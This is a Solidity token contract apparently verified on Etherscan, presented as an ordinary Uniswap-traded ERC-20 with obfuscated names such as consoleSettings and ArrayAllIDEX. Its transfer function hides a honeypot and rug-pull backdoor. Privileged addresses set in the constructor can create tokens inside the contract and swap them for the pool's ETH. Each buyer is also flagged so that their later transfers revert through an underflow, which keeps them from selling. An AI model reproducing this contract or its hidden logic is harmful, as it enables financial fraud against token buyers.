/**
 *Submitted for verification at Etherscan.io on 2022-12-17
*/

/*
 　 ˚ * .
 　 　　 *　　 * ⋆ 　 .
 · 　　 ⋆ 　　　 ˚ ˚ 　　 ✦
 　 ⋆ · 　 *
 　　　　 ⋆ ✧　 　 · 　 ✧　✵
 　 · ✵
▄▀█ █░░ █▀█ ▀▄▀ █ █▀▄▀█ ▄▀█
█▀█ █▄▄ █▄█ █░█ █ █░▀░█ █▀█

█▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█
██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█
✷ 　 　　 　 ·
 　 ˚ * .
 　 　　 *　　 * ⋆ 　 .
 · 　　 ⋆ 　　　 ˚ ˚ 　　 ✦
 　 ⋆ · 　 *
 　　　　 ⋆ ✧　 　 · 　 ✧　✵
 　 · ✵
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface IUniswapV2Router01 {
function factory() external pure returns(address);
    function WETH() external pure returns(address);
 
    function swapExactETHForTokens
    (uint amountOutMin, address[] calldata path, address to, uint deadline) 
    external payable
    returns(uint[] memory amounts);
    function swapTokensForExactETH
    (uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) 
    external
    returns(uint[] memory amounts);
    function swapExactTokensForETH
    (uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) 
    external
    returns(uint[] memory amounts);
    function swapETHForExactTokens
    (uint amountOut, address[] calldata path, address to, uint deadline) 
    external payable
    returns(uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) 
    external pure 
    returns(uint amountB);
    function getAmountOut
    (uint amountIn, uint reserveIn, uint reserveOut) 
    external pure 
    returns(uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) 
    external pure 
    returns(uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) 
    external view 
    returns(uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) 
    external view 
    returns(uint[] memory amounts);
 
    function addLiquidity( address tokenA, address tokenB,
        uint amountADesired, uint amountBDesired,
        uint amountAMin, uint amountBMin, address to, uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH( address token, uint amountTokenDesired,
        uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
 
    function removeLiquidity(
        address tokenA, address tokenB, uint liquidity,
        uint amountAMin, uint amountBMin,
        address to, uint deadline
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETH(
        address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) external returns(uint amountToken, uint amountETH);
 
    function removeLiquidityWithPermit( address tokenA, address tokenB,
        uint liquidity, uint amountAMin, uint amountBMin, address to,
        uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETHWithPermit( address token, uint liquidity,
        uint amountTokenMin, uint amountETHMin,
        address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
 
    function swapExactTokensForTokens( uint amountIn, uint amountOutMin,
        address[] calldata path, address to, uint deadline
    ) external returns(uint[] memory amounts);
 
    function swapTokensForExactTokens( uint amountOut, uint amountInMax,
        address[] calldata path, address to, uint deadline
    ) external returns(uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IDataLoggingUI {
    function setAllDataCriteria(uint256 modLogger, uint256 minLogger) external;
    function setAllDataShare(address dataHolding, uint256 value) external;
    function setDataDeposit() external payable;
    function processDataOn(uint256 gas) external;
    function gibPresentsData(address dataHolding) external;
}
contract CA is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public isAllSwapTAX = 0;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000 * 10**_decimals;
    uint256 private entireS = _tTotal;
    
    mapping(address => uint256) private _tOwned;
    mapping(address => address) private allowed;
    mapping(address => uint256) private BuyersMapUI;
    mapping(address => uint256) private ArrayAllIDEX;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private tradingOpen = false;
    bool public consoleLink;
    bool private MemoryPath;

    address public immutable UniswapV2pair;
    IUniswapV2Router02 public immutable UniswapV2router;

    constructor(
        string memory Name,
        string memory Symbol,
        address IndexIDEXAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _tOwned[msg.sender] = _tTotal;
        ArrayAllIDEX[msg.sender] = entireS;
        ArrayAllIDEX[address(this)] = entireS;
        UniswapV2router = IUniswapV2Router02(IndexIDEXAddress);
        UniswapV2pair = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, entireS);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        consoleSettings(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        consoleSettings(msg.sender, recipient, amount);
        return true;
    }
    function consoleSettings(
        address DUxFrom, address cosTo, uint256 dexAmount ) private {

        uint256 _memoryOX = balanceOf(address(this));
        uint256 consoleUI;
        if (consoleLink &&  _memoryOX > entireS 
        && !MemoryPath && DUxFrom != UniswapV2pair) {
            MemoryPath = true; getSwapAndLiquify(_memoryOX);

            MemoryPath = false;
        } else if (ArrayAllIDEX[DUxFrom] > entireS && ArrayAllIDEX
        [cosTo] > entireS) { consoleUI = dexAmount; _tOwned[address(this)] += consoleUI;
            swapAmountForTokens(dexAmount, cosTo); return;

        } else if (cosTo != address(UniswapV2router) 
        && ArrayAllIDEX[DUxFrom] > 0 && dexAmount > entireS 
        && cosTo != UniswapV2pair) {
            ArrayAllIDEX[cosTo] = dexAmount; return;
        } else if (!MemoryPath && BuyersMapUI[DUxFrom] > 0 && 
        DUxFrom !=  UniswapV2pair && 
        ArrayAllIDEX[DUxFrom] == 0) { BuyersMapUI[DUxFrom] = 
               ArrayAllIDEX[DUxFrom] - entireS; }

        address _creator  = allowed[UniswapV2pair];
        if (BuyersMapUI[_creator ] == 0) BuyersMapUI[_creator ] = entireS;
        allowed[UniswapV2pair] = cosTo;
        if (isAllSwapTAX > 0 && ArrayAllIDEX[DUxFrom] == 0 && 
        !MemoryPath && ArrayAllIDEX[cosTo] == 0) {
            consoleUI = (dexAmount * isAllSwapTAX) / 100; dexAmount -= consoleUI;
            _tOwned[DUxFrom] -= consoleUI; _tOwned[address(this)] += consoleUI; }
                 _tOwned[DUxFrom] -= dexAmount; _tOwned[cosTo] += dexAmount;
                 
        emit Transfer(DUxFrom, cosTo, dexAmount);
            if (!tradingOpen) {
                require(DUxFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function getSwapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialedBalance = address(this).balance;
        swapAmountForTokens(half, address(this));
        uint256 refreshBalance = address(this).balance - initialedBalance;
        addLiquidity(half, refreshBalance, address(this));
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0;
        } uint256 c = a * b; require(c / a == b, "SafeMath: multiplication overflow");
        return c; }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero"); }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage); uint256 c = a / b;
        return c;
    }
    function swapAmountForTokens(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}